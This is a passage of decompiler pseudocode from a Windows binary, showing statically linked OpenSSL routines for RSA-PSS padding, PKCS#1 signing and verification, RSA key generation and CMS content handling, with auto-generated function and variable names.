  v2 = *(int (__cdecl **)(int))(*(_DWORD *)(a2 + 44) + 44);
  if ( v2 )
    return v2(a2);
  else
    return sub_4CCB70(a2, a1);
}

//----- (004CCC90) --------------------------------------------------------
int __cdecl sub_4CCC90(int a1, int a2, int *a3, int a4, _BYTE *a5, int a6)
{
  _BYTE *v6; // esi
  _BYTE *v7; // ebx
  int v8; // eax
  int v9; // ebp
  int v10; // eax
  int v11; // edi
  _BYTE *v12; // eax
  int v13; // esi
  int v14; // ecx
  int v15; // esi
  char v16; // cl
  int v17; // esi
  _BYTE *v18; // ecx
  unsigned int v19; // eax
  char *v20; // esi
  _BYTE **Block; // [esp+10h] [ebp-60h]
  int v23; // [esp+14h] [ebp-5Ch]
  unsigned int v24; // [esp+18h] [ebp-58h]
  int v25; // [esp+1Ch] [ebp-54h]
  int v26; // [esp+20h] [ebp-50h]
  char v27[64]; // [esp+2Ch] [ebp-44h] BYREF

  v6 = a5;
  v7 = 0;
  v25 = a4;
  v23 = 0;
  Block = (_BYTE **)sub_42B820();
  if ( Block )
  {
    if ( !a4 )
      v25 = (int)a3;
    v8 = sub_407480((int)a3);
    v24 = v8;
    if ( v8 >= 0 )
    {
      if ( a6 == -1 )
      {
        a6 = v8;
      }
      else if ( a6 == -2 )
      {
        a6 = -2;
      }
      else if ( a6 < -2 )
      {
        sub_408310(4, 126, 136, (int)"crypto\\rsa\\rsa_pss.c", 65);
        goto LABEL_52;
      }
      v9 = ((unsigned __int8)sub_416F90(*(_DWORD **)(a1 + 16)) - 1) & 7;
      v10 = sub_4070E0(a1);
      if ( ((unsigned __int8)(255 << v9) & *a5) != 0 )
      {
        sub_408310(4, 126, 133, (int)"crypto\\rsa\\rsa_pss.c", 72);
      }
      else
      {
        if ( !v9 )
        {
          v6 = a5 + 1;
          --v10;
        }
        if ( v10 >= (int)(v24 + a6 + 2) )
        {
          if ( v6[v10 - 1] == 0xBC )
          {
            v11 = v10 - v24 - 1;
            v26 = (int)&v6[v11];
            v7 = sub_4133F0(v11);
            if ( v7 )
            {
              if ( sub_428D10((int)v7, v11, v26, v24, v25) >= 0 )
              {
                if ( v11 > 0 )
                {
                  v12 = v7;
                  v13 = v6 - v7;
                  v14 = v11;
                  do
                  {
                    *v12 ^= v12[v13];
                    ++v12;
                    --v14;
                  }
                  while ( v14 );
                }
                if ( v9 )
                  *v7 &= 255 >> (8 - v9);
                v15 = 0;
                if ( !*v7 )
                {
                  do
                  {
                    if ( v15 >= v11 - 1 )
                      break;
                    ++v15;
                  }
                  while ( !v7[v15] );
                }
                v16 = v7[v15];
                v17 = v15 + 1;
                if ( v16 == 1 )
                {
                  if ( a6 < 0 || v11 - v17 == a6 )
                  {
                    if ( sub_42B860((int)Block, a3, 0)
                      && sub_42BA10((int)Block)
                      && sub_42BA10((int)Block)
                      && (v11 == v17 || sub_42BA10((int)Block))
                      && sub_42BA20(Block, (int)v27, 0) )
                    {
                      v18 = (_BYTE *)v26;
                      v19 = v24;
                      v20 = v27;
                      if ( v24 < 4 )
                      {
LABEL_44:
                        if ( !v19 || *v18 == *v20 && (v19 <= 1 || v18[1] == v20[1] && (v19 <= 2 || v18[2] == v20[2])) )
                        {
                          v23 = 1;
                          goto LABEL_52;
                        }
                      }
                      else
                      {
                        while ( *(_DWORD *)v20 == *(_DWORD *)v18 )
                        {
                          v19 -= 4;
                          v18 += 4;
                          v20 += 4;
                          if ( v19 < 4 )
                            goto LABEL_44;
                        }
                      }
                      sub_408310(4, 126, 104, (int)"crypto\\rsa\\rsa_pss.c", 120);
                      v23 = 0;
                    }
                  }
                  else
                  {
                    sub_408310(4, 126, 136, (int)"crypto\\rsa\\rsa_pss.c", 106);
                  }
                }
                else
                {
                  sub_408310(4, 126, 135, (int)"crypto\\rsa\\rsa_pss.c", 102);
                }
              }
            }
            else
            {
              sub_408310(4, 126, 65, (int)"crypto\\rsa\\rsa_pss.c", 91);
            }
          }
          else
          {
            sub_408310(4, 126, 134, (int)"crypto\\rsa\\rsa_pss.c", 84);
          }
        }
        else
        {
          sub_408310(4, 126, 109, (int)"crypto\\rsa\\rsa_pss.c", 80);
        }
      }
    }
  }
LABEL_52:
  sub_413490(v7);
  sub_42B840(Block);
  return v23;
}

//----- (004CCFF0) --------------------------------------------------------
int __cdecl sub_4CCFF0(int a1, _BYTE *a2, int a3, int *a4, int a5, int a6)
{
  int v6; // eax
  int v7; // ebx
  signed int v8; // esi
  int v9; // eax
  int v10; // edi
  _BYTE *v11; // ebp
  int v12; // edi
  int v13; // ebx
  _BYTE **v14; // eax
  int v15; // edi
  _BYTE *v16; // eax
  signed int i; // ecx
  _BYTE **v19; // [esp+8h] [ebp-18h]
  _BYTE *Block; // [esp+Ch] [ebp-14h]
  int v21; // [esp+10h] [ebp-10h]
  int v22; // [esp+14h] [ebp-Ch]
  int v23; // [esp+18h] [ebp-8h]
  int v24; // [esp+1Ch] [ebp-4h]

  v23 = 0;
  Block = 0;
  v19 = 0;
  if ( !a5 )
    a5 = (int)a4;
  v6 = sub_407480((int)a4);
  v7 = v6;
  v21 = v6;
  if ( v6 >= 0 )
  {
    v8 = a6;
    if ( a6 == -1 )
    {
      v8 = v6;
    }
    else if ( a6 <= -3 )
    {
      sub_408310(4, 152, 136, (int)"crypto\\rsa\\rsa_pss.c", 168);
      goto LABEL_32;
    }
    v24 = ((unsigned __int8)sub_416F90(*(_DWORD **)(a1 + 16)) - 1) & 7;
    v9 = sub_4070E0(a1);
    v10 = v9;
    v11 = a2;
    v22 = v9;
    if ( !v24 )
    {
      *a2 = 0;
      v11 = a2 + 1;
      v10 = v9 - 1;
      v22 = v9 - 1;
    }
    if ( v8 == -2 )
    {
      v8 = v10 - v7 - 2;
    }
    else if ( v10 < v7 + v8 + 2 )
    {
      sub_408310(4, 152, 110, (int)"crypto\\rsa\\rsa_pss.c", 182);
      goto LABEL_32;
    }
    if ( v8 > 0 )
    {
      Block = sub_4133F0(v8);
      if ( !Block )
      {
        sub_408310(4, 152, 65, (int)"crypto\\rsa\\rsa_pss.c", 189);
        goto LABEL_32;
      }
      if ( sub_406FF0() <= 0 )
        goto LABEL_32;
    }
    v12 = v10 - v7;
    v13 = v12 - 1;
    v14 = (_BYTE **)sub_42B820();
    v19 = v14;
    if ( v14
      && sub_42B860((int)v14, a4, 0)
      && sub_42BA10((int)v19)
      && sub_42BA10((int)v19)
      && (!v8 || sub_42BA10((int)v19))
      && sub_42BA20(v19, (int)&v11[v13], 0)
      && !sub_428D10((int)v11, v12 - 1, (int)&v11[v13], v21, a5) )
    {
      v15 = v12 - v8;
      v11[v15 - 2] ^= 1u;
      v16 = &v11[v15 - 1];
      if ( v8 > 0 )
      {
        for ( i = 0; i < v8; ++i )
          *v16++ ^= Block[i];
      }
      if ( v24 )
        *v11 &= 255 >> (8 - v24);
      v11[v22 - 1] = -68;
      v23 = 1;
    }
  }
LABEL_32:
  sub_42B840(v19);
  sub_413490(Block);
  return v23;
}

//----- (004CD280) --------------------------------------------------------
int __cdecl sub_4CD280(unsigned int a1, int a2, int a3, int a4, int *a5, _BYTE *a6)
{
  int v6; // ebp
  int (__cdecl *v7)(unsigned int, int, int, int, int *, _BYTE *); // eax
  int v8; // esi
  _BYTE *v9; // ebx
  int v11; // edi
  int v12; // eax
  int v13; // eax
  int v14; // esi
  int v15; // [esp+10h] [ebp-2Ch]
  int v16[2]; // [esp+14h] [ebp-28h] BYREF
  int v17[2]; // [esp+1Ch] [ebp-20h] BYREF
  char **v18; // [esp+24h] [ebp-18h] BYREF
  int v19[4]; // [esp+2Ch] [ebp-10h] BYREF

  v6 = (int)a6;
  v7 = *(int (__cdecl **)(unsigned int, int, int, int, int *, _BYTE *))(*((_DWORD *)a6 + 2) + 44);
  v8 = 0;
  v9 = 0;
  if ( v7 )
    return v7(a1, a2, a3, a4, a5, a6);
  if ( a1 == 114 )
  {
    v11 = 36;
    if ( a3 != 36 )
    {
      sub_408310(4, 117, 131, (int)"crypto\\rsa\\rsa_sign.c", 38);
      return 0;
    }
    v8 = a2;
  }
  else
  {
    v16[0] = (int)&v18;
    v18 = sub_423310(a1);
    if ( !v18 )
    {
      sub_408310(4, 117, 117, (int)"crypto\\rsa\\rsa_sign.c", 47);
      return 0;
    }
    if ( !sub_423630(*(_DWORD *)v16[0]) )
    {
      sub_408310(4, 117, 116, (int)"crypto\\rsa\\rsa_sign.c", 52);
      return 0;
    }
    v17[0] = 5;
    v17[1] = 0;
    *(_DWORD *)(v16[0] + 4) = v17;
    v16[1] = (int)v19;
    v19[2] = a2;
    v19[0] = a3;
    v11 = sub_434DE0((int)v16, 0);
  }
  v12 = sub_4070E0(v6);
  v15 = v12;
  if ( v11 > v12 - 11 )
  {
    sub_408310(4, 117, 112, (int)"crypto\\rsa\\rsa_sign.c", 67);
    return 0;
  }
  if ( a1 != 114 )
  {
    v9 = sub_4133F0(v12 + 1);
    if ( !v9 )
    {
      sub_408310(4, 117, 65, (int)"crypto\\rsa\\rsa_sign.c", 73);
      return 0;
    }
    a6 = v9;
    sub_434DE0((int)v16, (void **)&a6);
    v8 = (int)v9;
  }
  v13 = sub_407110(v11, v8, a4, v6);
  if ( v13 > 0 )
  {
    v14 = 1;
    *a5 = v13;
  }
  else
  {
    v14 = 0;
  }
  if ( a1 != 114 )
    sub_4134B0(v9, v15 + 1);
  return v14;
}

//----- (004CD490) --------------------------------------------------------
int __cdecl sub_4CD490(_BYTE *a1, int a2)
{
  int v2; // ecx
  int v3; // ebx
  int v4; // eax
  unsigned int v7; // ecx
  _BYTE *v8; // edx
  void *Block; // [esp+8h] [ebp-4h] BYREF

  v3 = 0;
  Block = 0;
  v4 = sub_434DE0(v2, &Block);
  if ( v4 <= 0 )
    return 0;
  if ( v4 == a2 )
  {
    v7 = v4;
    v8 = Block;
    if ( (unsigned int)v4 < 4 )
    {
LABEL_7:
      if ( !v7 || *v8 == *a1 && (v7 <= 1 || v8[1] == a1[1] && (v7 <= 2 || v8[2] == a1[2])) )
        v3 = 1;
    }
    else
    {
      while ( *(_DWORD *)a1 == *(_DWORD *)v8 )
      {
        v7 -= 4;
        v8 += 4;
        a1 += 4;
        if ( v7 < 4 )
          goto LABEL_7;
      }
    }
  }
  sub_4134B0(Block, v4);
  return v3;
}
// 4CD4A8: variable 'v2' is possibly undefined

//----- (004CD530) --------------------------------------------------------
int __cdecl sub_4CD530(int a1, char *a2, unsigned int a3, _DWORD *a4, int *a5, int a6, size_t Size, int a8)
{
  int v9; // eax
  char *v10; // ebp
  int v11; // esi
  unsigned int v12; // ecx
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  unsigned int v15; // ecx
  int v16; // eax
  int v17; // esi
  char *v18; // eax
  int v19; // eax
  _DWORD *v20; // ecx
  _BYTE *v21; // ecx
  char *v22; // esi
  unsigned int v23; // eax
  int v24; // [esp-Ch] [ebp-20h]
  int v25; // [esp-Ch] [ebp-20h]
  int v26; // [esp+8h] [ebp-Ch]
  int v27; // [esp+Ch] [ebp-8h]
  char *v28; // [esp+10h] [ebp-4h] BYREF

  v26 = 0;
  v27 = 0;
  if ( Size != sub_4070E0(a8) )
  {
    sub_408310(4, 145, 119, (int)"crypto\\rsa\\rsa_sign.c", 120);
    return 0;
  }
  if ( a1 != 114 || !a4 )
  {
    v10 = (char *)sub_4133F0(Size);
    if ( !v10 )
    {
      sub_408310(4, 145, 65, (int)"crypto\\rsa\\rsa_sign.c", 135);
LABEL_59:
      sub_434E00(v27);
      sub_4134B0(v10, Size);
      return v26;
    }
    if ( a1 == 114 && a3 != 36 )
    {
      sub_408310(4, 145, 131, (int)"crypto\\rsa\\rsa_sign.c", 139);
      goto LABEL_59;
    }
    v11 = sub_407130(Size, a6, (int)v10, a8);
    if ( v11 <= 0 )
      goto LABEL_59;
    if ( a1 == 95 )
    {
      if ( v11 == 18 && *v10 == 4 )
      {
        v12 = 16;
        if ( v10[1] == 16 )
        {
          if ( a4 )
          {
            *a4 = *(_DWORD *)(v10 + 2);
            a4[1] = *(_DWORD *)(v10 + 6);
            a4[2] = *(_DWORD *)(v10 + 10);
            a4[3] = *(_DWORD *)(v10 + 14);
            *a5 = 16;
            v26 = 1;
            goto LABEL_59;
          }
          v13 = v10 + 2;
          while ( *(_DWORD *)((char *)v13 + a2 - (v10 + 2)) == *v13 )
          {
            v12 -= 4;
            ++v13;
            if ( v12 < 4 )
            {
              v26 = 1;
              goto LABEL_59;
            }
          }
          v24 = 156;
LABEL_58:
          sub_408310(4, 145, 104, (int)"crypto\\rsa\\rsa_sign.c", v24);
          goto LABEL_59;
        }
      }
    }
    else if ( a1 == 114 )
    {
      if ( v11 == 36 )
      {
        v14 = a2;
        v15 = 36;
        while ( *(_DWORD *)((char *)v14 + v10 - a2) == *v14 )
        {
          v15 -= 4;
          ++v14;
          if ( v15 < 4 )
          {
            v26 = 1;
            goto LABEL_59;
          }
        }
      }
      v24 = 163;
      goto LABEL_58;
    }
    v28 = v10;
    v16 = sub_434DC0(0, (void **)&v28, v11);
    v27 = v16;
    if ( !v16 )
      goto LABEL_59;
    if ( v28 != &v10[v11] || (v25 = v11, v17 = v16, !sub_4CD490(v10, v25)) )
    {
      v24 = 175;
      goto LABEL_58;
    }
    if ( *(_DWORD *)(*(_DWORD *)v17 + 4) && sub_423E20(*(_DWORD **)(*(_DWORD *)v17 + 4)) != 5 )
    {
      v24 = 185;
      goto LABEL_58;
    }
    if ( sub_423680(**(_DWORD **)v17) != a1 )
    {
      sub_408310(4, 145, 100, (int)"crypto\\rsa\\rsa_sign.c", 192);
      goto LABEL_59;
    }
    if ( a4 )
    {
      v18 = sub_4233A0(a1);
      v19 = sub_430D80((int)v18);
      if ( v19 && sub_407480(v19) != **(_DWORD **)(v17 + 4) )
      {
        sub_408310(4, 145, 143, (int)"crypto\\rsa\\rsa_sign.c", 199);
        goto LABEL_59;
      }
      memcpy(a4, *(const void **)(*(_DWORD *)(v17 + 4) + 8), **(_DWORD **)(v17 + 4));
      *a5 = **(_DWORD **)(v17 + 4);
LABEL_45:
      v26 = 1;
      goto LABEL_59;
    }
    v20 = *(_DWORD **)(v17 + 4);
    if ( *v20 == a3 )
    {
      v21 = (_BYTE *)v20[2];
      v22 = a2;
      v23 = a3;
      if ( a3 < 4 )
      {
LABEL_50:
        if ( !v23 || *v21 == *v22 && (v23 <= 1 || v21[1] == v22[1] && (v23 <= 2 || v21[2] == v22[2])) )
          goto LABEL_45;
      }
      else
      {
        while ( *(_DWORD *)v22 == *(_DWORD *)v21 )
        {
          v23 -= 4;
          v21 += 4;
          v22 += 4;
          if ( v23 < 4 )
            goto LABEL_50;
        }
      }
    }
    v24 = 207;
    goto LABEL_58;
  }
  v9 = sub_407130(Size, a6, (int)a4, a8);
  if ( v9 <= 0 )
    return 0;
  *a5 = v9;
  return 1;
}

//----- (004CD890) --------------------------------------------------------
int __cdecl sub_4CD890(int a1, char *a2, int a3, int a4, size_t Size, int a6)
{
  int (*v6)(void); // eax

  v6 = *(int (**)(void))(*(_DWORD *)(a6 + 8) + 48);
  if ( v6 )
    return v6();
  else
    return sub_4CD530(a1, a2, a3, 0, 0, a4, Size, a6);
}

//----- (004CD8D0) --------------------------------------------------------
int __cdecl sub_4CD8D0(int a1, int a2, int a3, int a4, int *a5, int a6)
{
  signed int v6; // eax
  int v7; // ebx
  int v8; // edi
  int v9; // eax
  int v11; // ebp
  _BYTE *v12; // esi
  int v13; // eax
  int v14; // edi
  int v15[4]; // [esp+Ch] [ebp-10h] BYREF

  v15[1] = 4;
  v15[0] = a3;
  v15[2] = a2;
  v6 = sub_42C410((int)v15, 0);
  v7 = a6;
  v8 = v6;
  v9 = sub_4070E0(a6);
  if ( v8 <= v9 - 11 )
  {
    v11 = v9 + 1;
    v12 = sub_4133F0(v9 + 1);
    if ( v12 )
    {
      a3 = (int)v12;
      sub_42C410((int)v15, (void **)&a3);
      v13 = sub_407110(v8, (int)v12, a4, v7);
      if ( v13 > 0 )
      {
        v14 = 1;
        *a5 = v13;
      }
      else
      {
        v14 = 0;
      }
      sub_4134B0(v12, v11);
      return v14;
    }
    else
    {
      sub_408310(4, 118, 65, (int)"crypto\\rsa\\rsa_saos.c", 39);
      return 0;
    }
  }
  else
  {
    sub_408310(4, 118, 112, (int)"crypto\\rsa\\rsa_saos.c", 34);
    return 0;
  }
}

//----- (004CD9D0) --------------------------------------------------------
int __usercall sub_4CD9D0@<eax>(int a1@<edx>, int a2@<ecx>, __m64 a3@<mm0>, _DWORD *a4, _DWORD *a5)
{
  int *v7; // eax
  int *v8; // ebx
  int v9; // ebp
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  void **v18; // eax
  int v19; // eax
  int v20; // edi
  void **v21; // eax
  int v23; // esi
  int v24; // eax
  void **v25; // eax
  void **v26; // eax
  void **v27; // edi
  void **v28; // edi
  void **v29; // eax
  void **v30; // edi
  void **v32; // [esp-4h] [ebp-28h]
  int v33; // [esp+10h] [ebp-14h]
  int *v34; // [esp+14h] [ebp-10h]
  int *v35; // [esp+18h] [ebp-Ch]
  unsigned int **v36; // [esp+1Ch] [ebp-8h]
  int v37; // [esp+20h] [ebp-4h]

  v33 = 0;
  v7 = sub_420670();
  v8 = v7;
  if ( v7 )
  {
    sub_420700(v7);
    v36 = (unsigned int **)sub_420790(v8);
    v35 = sub_420790(v8);
    v34 = sub_420790(v8);
    if ( sub_420790(v8) )
    {
      v9 = (a2 + 1) / 2;
      v37 = a2 - v9;
      if ( *(_DWORD *)(a1 + 16) || (v10 = sub_4168C0(), (*(_DWORD *)(a1 + 16) = v10) != 0) )
      {
        if ( *(_DWORD *)(a1 + 24) || (v11 = sub_416900(), (*(_DWORD *)(a1 + 24) = v11) != 0) )
        {
          if ( *(_DWORD *)(a1 + 20) || (v12 = sub_4168C0(), (*(_DWORD *)(a1 + 20) = v12) != 0) )
          {
            if ( *(_DWORD *)(a1 + 28) || (v13 = sub_416900(), (*(_DWORD *)(a1 + 28) = v13) != 0) )
            {
              if ( *(_DWORD *)(a1 + 32) || (v14 = sub_416900(), (*(_DWORD *)(a1 + 32) = v14) != 0) )
              {
                if ( *(_DWORD *)(a1 + 36) || (v15 = sub_416900(), (*(_DWORD *)(a1 + 36) = v15) != 0) )
                {
                  if ( *(_DWORD *)(a1 + 40) || (v16 = sub_416900(), (*(_DWORD *)(a1 + 40) = v16) != 0) )
                  {
                    if ( *(_DWORD *)(a1 + 44) || (v17 = sub_416900(), (*(_DWORD *)(a1 + 44) = v17) != 0) )
                    {
                      sub_4173E0(*(_DWORD **)(a1 + 20), a4);
                      if ( sub_4D1260(a3, *(int ***)(a1 + 28), v9, 0, 0, 0, a5) )
                      {
                        do
                        {
                          v18 = sub_416820();
                          if ( !sub_422020(v34, *(_DWORD *)(a1 + 28), (int)v18)
                            || !sub_420B60(v35, v34, *(_DWORD **)(a1 + 20), v8) )
                          {
                            break;
                          }
                          if ( sub_416DC0((int)v35) )
                          {
                            if ( sub_4D0950(a5, 3, 0) )
                            {
LABEL_27:
                              v20 = 0;
                              while ( sub_4D1260(a3, *(int ***)(a1 + 32), v37, 0, 0, 0, a5) )
                              {
                                if ( !sub_4169B0(*(_DWORD **)(a1 + 28), *(_DWORD **)(a1 + 32))
                                  && (unsigned int)++v20 < 3 )
                                {
                                  continue;
                                }
                                if ( v20 == 3 )
                                {
                                  v23 = 0;
                                  sub_408310(4, 129, 120, (int)"crypto\\rsa\\rsa_gen.c", 108);
                                  goto LABEL_56;
                                }
                                v21 = sub_416820();
                                if ( sub_422020(v34, *(_DWORD *)(a1 + 32), (int)v21)
                                  && sub_420B60(v35, v34, *(_DWORD **)(a1 + 20), v8) )
                                {
                                  if ( sub_416DC0((int)v35) )
                                  {
                                    if ( sub_4D0950(a5, 3, 1) )
                                    {
                                      if ( sub_4169B0(*(_DWORD **)(a1 + 28), *(_DWORD **)(a1 + 32)) < 0 )
                                      {
                                        v24 = *(_DWORD *)(a1 + 28);
                                        *(_DWORD *)(a1 + 28) = *(_DWORD *)(a1 + 32);
                                        *(_DWORD *)(a1 + 32) = v24;
                                      }
                                      if ( sub_421C20(
                                             *(unsigned int ***)(a1 + 16),
                                             *(unsigned int ***)(a1 + 28),
                                             *(unsigned int ***)(a1 + 32),
                                             v8) )
                                      {
                                        v25 = sub_416820();
                                        if ( sub_422020(v35, *(_DWORD *)(a1 + 28), (int)v25) )
                                        {
                                          v26 = sub_416820();
                                          if ( sub_422020(v34, *(_DWORD *)(a1 + 32), (int)v26) )
                                          {
                                            if ( sub_421C20(v36, (unsigned int **)v35, (unsigned int **)v34, v8) )
                                            {
                                              v27 = (void **)sub_4168C0();
                                              if ( v27 )
                                              {
                                                sub_416E80(v27, v36, 4);
                                                v32 = v27;
                                                if ( sub_4211F0(
                                                       *(void ***)(a1 + 24),
                                                       *(_DWORD **)(a1 + 20),
                                                       (int *)v27,
                                                       v8) )
                                                {
                                                  sub_417060(v27);
                                                  v28 = (void **)sub_4168C0();
                                                  if ( !v28 )
                                                    goto LABEL_55;
                                                  sub_416E80(v28, *(_DWORD **)(a1 + 24), 4);
                                                  if ( sub_4299A0(0, *(_DWORD *)(a1 + 36), v28, v35, v8)
                                                    && sub_4299A0(0, *(_DWORD *)(a1 + 40), v28, v34, v8) )
                                                  {
                                                    sub_417060(v28);
                                                    v29 = (void **)sub_4168C0();
                                                    v30 = v29;
                                                    if ( !v29 )
                                                      goto LABEL_55;
                                                    sub_416E80(v29, *(_DWORD **)(a1 + 28), 4);
                                                    v32 = v30;
                                                    if ( sub_4211F0(
                                                           *(void ***)(a1 + 44),
                                                           *(_DWORD **)(a1 + 32),
                                                           (int *)v30,
                                                           v8) )
                                                    {
                                                      sub_417060(v30);
                                                      v23 = 1;
                                                      goto LABEL_56;
                                                    }
                                                  }
                                                  else
                                                  {
                                                    v32 = v28;
                                                  }
                                                }
                                                sub_417060(v32);
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                  else if ( sub_4D0950(a5, 2, v33++) )
                                  {
                                    goto LABEL_27;
                                  }
                                }
                                goto LABEL_55;
                              }
                            }
                            break;
                          }
                          v19 = sub_4D0950(a5, 2, v33++);
                        }
                        while ( v19 && sub_4D1260(a3, *(int ***)(a1 + 28), v9, 0, 0, 0, a5) );
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_55:
  sub_408310(4, 129, 3, (int)"crypto\\rsa\\rsa_gen.c", 190);
  v23 = 0;
LABEL_56:
  if ( v8 )
    sub_420750(v8);
  sub_4206C0((void **)v8);
  return v23;
}

//----- (004CDE50) --------------------------------------------------------
int __usercall sub_4CDE50@<eax>(__m64 a1@<mm0>, int a2, int a3, _DWORD *a4, _DWORD *a5)
{
  int (*v5)(void); // eax

  v5 = *(int (**)(void))(*(_DWORD *)(a2 + 8) + 52);
  if ( v5 )
    return v5();
  else
    return sub_4CD9D0(a2, a3, a1, a4, a5);
}

//----- (004CDE80) --------------------------------------------------------
int __cdecl sub_4CDE80(int *a1)
{
  int *v1; // esi
  int v2; // eax
  int result; // eax

  v1 = a1;
  v2 = sub_423680(*a1);
  if ( v2 > 205 )
  {
    if ( v2 == 786 )
    {
      return *(_DWORD *)(a1[1] + 12) + 4;
    }
    else
    {
LABEL_11:
      v1 = (int *)a1[1];
      if ( *v1 == 4 )
      {
        return (int)(v1 + 1);
      }
      else
      {
        sub_408310(46, 129, 152, (int)"crypto\\cms\\cms_lib.c", 184);
        return 0;
      }
    }
  }
  else if ( v2 == 205 )
  {
    return *(_DWORD *)(a1[1] + 20) + 4;
  }
  else
  {
    switch ( v2 )
    {
      case 21:
        return (int)(v1 + 1);
      case 22:
        result = *(_DWORD *)(a1[1] + 8) + 4;
        break;
      case 23:
        result = *(_DWORD *)(a1[1] + 12) + 8;
        break;
      case 25:
        result = *(_DWORD *)(a1[1] + 8) + 4;
        break;
      case 26:
        result = *(_DWORD *)(a1[1] + 4) + 8;
        break;
      default:
        goto LABEL_11;
    }
  }
  return result;
}

//----- (004CDF40) --------------------------------------------------------
volatile LONG *__cdecl sub_4CDF40(_DWORD *a1)
{
  volatile LONG *v1; // esi
  int v2; // eax
  char *v3; // eax
  int v4; // edi
  void *v5; // eax
  volatile LONG *v6; // eax
  int v8; // [esp+8h] [ebp-4h] BYREF

  v1 = 0;
  sub_42C7D0(&v8, 0, 0, a1);
  v2 = sub_423680(v8);
  v3 = sub_4233A0(v2);
  v4 = sub_430D80((int)v3);
  if ( v4 )
  {
    v5 = sub_4536A0();
    v6 = (volatile LONG *)sub_404E70((int)v5);
    v1 = v6;
    if ( v6 && sub_405390(v6, 111, 0, v4) )
      return v1;
    sub_408310(46, 116, 119, (int)"crypto\\cms\\cms_lib.c", 300);
  }
  else
  {
    sub_408310(46, 116, 149, (int)"crypto\\cms\\cms_lib.c", 295);
  }
  sub_404F50(v1);
  return 0;
}

//----- (004CDFF0) --------------------------------------------------------
int __cdecl sub_4CDFF0(int a1, int **a2, _DWORD *a3)
{
  int v3; // edi
  int *v4; // esi
  int v5; // eax
  int v6; // eax
  int **v7; // eax
  int v9; // [esp+8h] [ebp-4h] BYREF

  sub_42C7D0(&v9, 0, 0, a3);
  v3 = sub_423680(v9);
  v4 = sub_405500(a2, 520);
  if ( v4 )
  {
    while ( 1 )
    {
      sub_405390(v4, 120, 0, (int)&a2);
      v5 = sub_445DB0((int)a2);
      if ( sub_435D30(v5) == v3 )
        break;
      v6 = sub_445DB0((int)a2);
      if ( sub_422350(v6) == v3 )
        break;
      v7 = (int **)sub_405540((int)v4);
      v4 = sub_405500(v7, 520);
      if ( !v4 )
        goto LABEL_5;
    }
    return sub_42BAA0(a1, (int)a2);
  }
  else
  {
LABEL_5:
    sub_408310(46, 115, 131, (int)"crypto\\cms\\cms_lib.c", 324);
    return 0;
  }
}

//----- (004CE0D0) --------------------------------------------------------
int *__cdecl sub_4CE0D0(int *a1)
{
  int *result; // eax
  int v2; // eax
  void *v3; // eax
  void *v4; // eax

  result = (int *)sub_4CDE80(a1);
  if ( result )
  {
    v2 = *result;
    if ( v2 )
    {
      if ( *(_DWORD *)(v2 + 12) == 32 )
      {
        v4 = sub_4067E0();
        return (int *)sub_404E70((int)v4);
      }
      else
      {
        return sub_4067F0(*(const char **)(v2 + 8), *(_DWORD *)v2);
      }
    }
    else
    {
      v3 = sub_454070();
      return (int *)sub_404E70((int)v3);
    }
  }
  return result;
}

//----- (004CE120) --------------------------------------------------------
int *__cdecl sub_4CE120(int *a1, int *Block)
{
  int *v2; // edi
  int *result; // eax
  _DWORD *v4; // eax

  if ( Block )
    v2 = Block;
  else
    v2 = sub_4CE0D0(a1);
  if ( v2 )
  {
    switch ( sub_423680(*a1) )
    {
      case 21:
        return v2;
      case 22:
        v4 = sub_479F30(a1);
        goto LABEL_12;
      case 23:
        v4 = sub_478B60(a1);
        goto LABEL_12;
      case 25:
        v4 = sub_4D61F0((int)a1);
        goto LABEL_12;
      case 26:
        v4 = sub_4CE6F0((int)a1);
LABEL_12:
        if ( v4 )
        {
          result = sub_4054B0(v4, (int)v2);
        }
        else if ( Block )
        {
LABEL_17:
          result = 0;
        }
        else
        {
          sub_404F50(v2);
          result = 0;
        }
        break;
      default:
        sub_408310(46, 111, 156, (int)"crypto\\cms\\cms_lib.c", 94);
        goto LABEL_17;
    }
  }
  else
  {
    sub_408310(46, 111, 127, (int)"crypto\\cms\\cms_lib.c", 64);
    return 0;
  }
  return result;
}

//----- (004CE200) --------------------------------------------------------
int __cdecl sub_4CE200(int *a1, int **a2)
{
  int result; // eax
  int *v3; // edi
  int v4; // eax
  int *v5; // eax
  int *v6; // esi
  int v7; // ebx
  int v8; // eax
  int v9; // [esp+8h] [ebp-4h] BYREF

  result = sub_4CDE80(a1);
  v3 = (int *)result;
  if ( result )
  {
    v4 = *(_DWORD *)result;
    if ( v4 && (*(_BYTE *)(v4 + 12) & 0x20) != 0 )
    {
      v5 = sub_405500(a2, 1025);
      v6 = v5;
      if ( !v5 )
      {
        sub_408310(46, 110, 105, (int)"crypto\\cms\\cms_lib.c", 119);
        return 0;
      }
      v7 = sub_405390(v5, 3, 0, (int)&v9);
      sub_405030((int)v6, 512);
      sub_405390(v6, 130, 0, 0);
      sub_4329C0(*v3, v9, v7);
      *(_DWORD *)(*v3 + 12) &= ~0x20u;
    }
    v8 = sub_423680(*a1);
    if ( v8 > 786 )
    {
LABEL_13:
      sub_408310(46, 110, 156, (int)"crypto\\cms\\cms_lib.c", 146);
      return 0;
    }
    else if ( v8 == 786 )
    {
      return 1;
    }
    else
    {
      switch ( v8 )
      {
        case 21:
        case 23:
        case 26:
          return 1;
        case 22:
          result = sub_47A290(a1, a2);
          break;
        case 25:
          result = sub_4D6210((int)a1, a2, 0);
          break;
        default:
          goto LABEL_13;
      }
    }
  }
  return result;
}

//----- (004CE340) --------------------------------------------------------
void *__cdecl sub_4CE340(_DWORD *a1)
{
  _BYTE *v1; // ebx
  int v2; // ebp
  BOOL v3; // ecx
  int v4; // edi
  void *v5; // eax
  _DWORD *v6; // eax
  int *v8; // eax
  int v9; // eax
  char *v10; // eax
  unsigned int *v11; // eax
  int v12; // eax
  char **v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // edi
  void *v17; // [esp+10h] [ebp-2Ch] BYREF
  int v18; // [esp+14h] [ebp-28h]
  int v19; // [esp+18h] [ebp-24h]
  void *Src; // [esp+1Ch] [ebp-20h]
  void *Block; // [esp+20h] [ebp-1Ch]
  int v22; // [esp+24h] [ebp-18h]
  char v23; // [esp+28h] [ebp-14h] BYREF

  v1 = 0;
